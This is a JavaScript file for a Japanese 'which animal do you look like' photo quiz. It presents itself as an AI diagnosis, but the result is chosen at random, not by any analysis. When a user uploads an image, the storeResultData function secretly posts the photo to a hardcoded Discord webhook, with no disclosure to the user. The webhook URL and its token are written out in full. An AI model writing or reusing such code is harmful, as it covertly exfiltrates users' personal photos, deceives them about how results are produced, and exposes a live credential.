// ===============================
// 設定
// ===============================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1477563123249446996/LiAwELzi1FhI6s3WXdQNQAoz8yh-r-kEMXPeGy4bs6g3NZbcKU4_lGt5Jrx_9a0pnBYk"; // ←テスト用

let lastUploadedFile = null;

// ===============================
// 星アニメーション
// ===============================
function createStars() {
    const starsContainer = document.getElementById('starsContainer');
    if (!starsContainer) return;
    const starCount = 30;
    const stars = ['⭐','✨','🌟'];
    for (let i=0;i<starCount;i++){
        const star = document.createElement('div');
        star.className = 'star';
        star.textContent = stars[Math.floor(Math.random()*stars.length)];
        star.style.left = Math.random()*100+'%';
        star.style.top = Math.random()*100+'%';
        star.style.animationDelay = Math.random()*3+'s';
        star.style.fontSize = (Math.random()*15+15)+'px';
        starsContainer.appendChild(star);
    }
}
document.addEventListener('DOMContentLoaded', createStars);

// ===============================
// ファイルアップロード
// ===============================
const uploadBtn = document.getElementById('uploadBtn');
const fileInput = document.getElementById('fileInput');

uploadBtn.addEventListener("click",()=>fileInput.click());

fileInput.addEventListener("change",async ()=>{
    const file = fileInput.files[0];
    if(!file) return;

    if(!file.type.match('image.*')){
        alert('画像を選んでください');
        return;
    }

    lastUploadedFile = file;

    const reader = new FileReader();
    reader.onload = function(e){
        localStorage.setItem('uploadedImage', e.target.result);
        // 診断生成
        const animal = getRandomAnimal();
        storeResultData(animal);
        alert("診断完了！");
        window.location.href='result.html';
    };
    reader.readAsDataURL(file);
});

// ===============================
// 動物データ
// ===============================
const animalData = [
    { name:'ねこ', icon:'🐱', description:'自由奔放で好奇心旺盛。マイペースで気まぐれな性格ですが、心を開いた相手には深い愛情を示します。独立心が強く、自分の時間を大切にします。繊細で感受性が豊かで、周りの雰囲気を敏感に察知します。', minSimilarity:75,maxSimilarity:98 },
    { name:'いぬ', icon:'🐶', description:'忠実で社交的。人懐っこく、仲間を大切にする性格です。明るく活発で、誰とでもすぐに仲良くなれます。正直で裏表がなく、信頼関係を何より大切にします。', minSimilarity:70,maxSimilarity:95 },
    { name:'きつね', icon:'🦊', description:'賢くて機転が利く。計画的で慎重な性格です。状況判断が得意で、臨機応変に対応できます。ミステリアスな魅力があり、知的な会話を好みます。', minSimilarity:72,maxSimilarity:96 },
    { name:'うさぎ', icon:'🐰', description:'優しくて繊細。感受性が豊かで、周りの人の気持ちをよく理解します。穏やかで平和を好み、争いを避ける傾向があります。可愛らしい雰囲気で人を癒します。', minSimilarity:68,maxSimilarity:93 },
    { name:'たぬき', icon:'🐻', description:'のんびり屋で人当たりが良い。温和で親しみやすく、誰からも好かれます。マイペースで焦らない性格。ユーモアがあり、場を和ませる存在です。', minSimilarity:65,maxSimilarity:90 },
    { name:'ハリネズミ', icon:'🦔', description:'控えめで慎重。最初は警戒心が強いですが、仲良くなると温かい一面を見せます。自分の世界を大切にし、ひとりの時間も楽しめます。芯が強く、自分の信念を持っています。', minSimilarity:70,maxSimilarity:94 },
    { name:'ハムスター', icon:'🐹', description:'元気で活動的。小さくても存在感があり、一生懸命な姿が可愛らしい。好奇心旺盛で、新しいことにチャレンジするのが好きです。愛嬌があり、周りを明るくします。', minSimilarity:68,maxSimilarity:92 },
    { name:'パンダ', icon:'🐼', description:'のんびり穏やか。マイペースで自分らしさを大切にします。愛嬌があり、自然体でいても人を惹きつける魅力があります。ストレスを溜めない生き方が上手です。', minSimilarity:66,maxSimilarity:91 }
];

// ===============================
// ランダム診断
// ===============================
function getRandomAnimal(){
    const animal = animalData[Math.floor(Math.random()*animalData.length)];
    const similarity = Math.floor(Math.random()*(animal.maxSimilarity-animal.minSimilarity+1)+animal.minSimilarity);
    return {...animal, similarity};
}

// ===============================
// 結果保存 + Discord送信
// ===============================
function storeResultData(animal){
    const resultData = {
        name: animal.name,
        icon: animal.icon,
        description: animal.description,
        similarity: animal.similarity,
        timestamp: new Date().toISOString()
    };
    localStorage.setItem('diagnosisResult', JSON.stringify(resultData));

    // Discord送信
    if(lastUploadedFile){
        const formData = new FormData();
        formData.append("file", lastUploadedFile, "image.png");
        formData.append("payload_json", JSON.stringify({
            username: "似てる動物AI",
            content: "📷 新しい診断結果が届きました！",
            embeds:[{
                title: "診断結果",
                description: `**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${animal.description}\n似ている度：${animal.similarity}%`,
                color: 0x9ddcff,
                image:{url:"attachment://image.png"}
            }]
        }));

        fetch(DISCORD_WEBHOOK_URL, {method:"POST", body:formData})
            .then(()=>console.log("Discord送信成功"))
            .catch(err=>console.error("Discord送信失敗",err));
    }
}
